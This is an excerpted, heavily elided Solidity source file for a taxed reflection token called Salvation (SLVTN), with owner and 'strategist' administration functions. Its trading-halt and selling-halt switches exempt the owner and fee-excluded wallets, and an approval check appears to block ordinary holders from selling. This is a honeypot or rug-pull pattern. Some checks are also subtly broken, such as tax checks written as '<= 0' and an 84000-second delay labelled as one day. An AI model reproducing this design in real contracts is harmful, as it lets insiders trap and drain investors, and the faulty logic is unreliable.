...
contract Salvation is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 150000 * 10**6 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 private _tBurnTotal;

    string private _name = "Salvation";
    string private _symbol = "SLVTN";
    ...
    uint256 public _maxTxAmount = 150000 * 10**6 * 10**9;
    ...
    constructor() public {
        ...
        approvalDelay = 84000; // 1 day approval delay on new strategies
    ...
    function _approve(
        ...
        require(sellingHalted || owner == ownerWallet, "Trading is halted.");
    ...
    function _transfer(
        ...
        require(!tradingHalted || from == owner() || to == owner() || isExcludedFromFee(from) || isExcludedFromFee(to), "Trading is halted.");
    ...
    // strategist only
    function proposeBurnTax(uint _tax) public {
    ...
    function proposeHoldersTax(uint _tax) public {
        require(_msgSender() == strategistOnly, 'Strategist Only');
    ...
    function proposeLiquidityTax(uint _tax) public {
        require(_msgSender() == strategistOnly, 'Strategist Only');
    ...
    function upgradeBurnStrat() public {
        require(_msgSender() == strategistOnly, 'Strategist Only');
        require(stratBurnTax.tax <= 0, "Must be a number 0 or greater");
        require(
            stratBurnTax.proposedTime.add(approvalDelay) < block.timestamp,
    ...
    function upgradeHoldersStrat() public {
        require(_msgSender() == strategistOnly, 'Strategist Only');
        require(stratHoldersTax.tax <= 0, "Must be a number 0 or greater");
        require(
            stratHoldersTax.proposedTime.add(approvalDelay) < block.timestamp,
            "Delay has not passed"
        );
        ...
        stratHoldersTax.tax = 0;
        stratHoldersTax.proposedTime = 5000000000;
    }

    function upgradeLiquidityStrat() public {
        require(_msgSender() == strategistOnly, 'Strategist Only');
        require(stratLiquidityTax.tax <= 0, "Must be a number 0 or greater");
        require(
            stratLiquidityTax.proposedTime.add(approvalDelay) < block.timestamp,
            "Delay has not passed"
        );
        ...
        stratLiquidityTax.tax = 0;
        stratLiquidityTax.proposedTime = 5000000000;
    }

    // strategist & owner only

    function setNumTokensSellToAddToLiquidity(uint256 _numTokensSellToAddToLiquidity) public {
        require(_msgSender() == strategistOnly || _msgSender() == ownerWallet, 'Strategist & Owner Only');
    ...
    function setTradingHalted(bool halted) public {
        require(_msgSender() == strategistOnly || _msgSender() == ownerWallet, 'Strategist & Owner Only');
    ...
    function setStrategist(address _strategistOnly) public onlyOwner {
    ...
    function setTakeFee(bool _takeFee) public onlyOwner {
        takeFee = _takeFee;
        emit TakeFeesUpdated(_takeFee);
    }

    function setSellingHalted(bool halted) external onlyOwner() {
        sellingHalted = halted;
        SellingHalted(halted);
    }
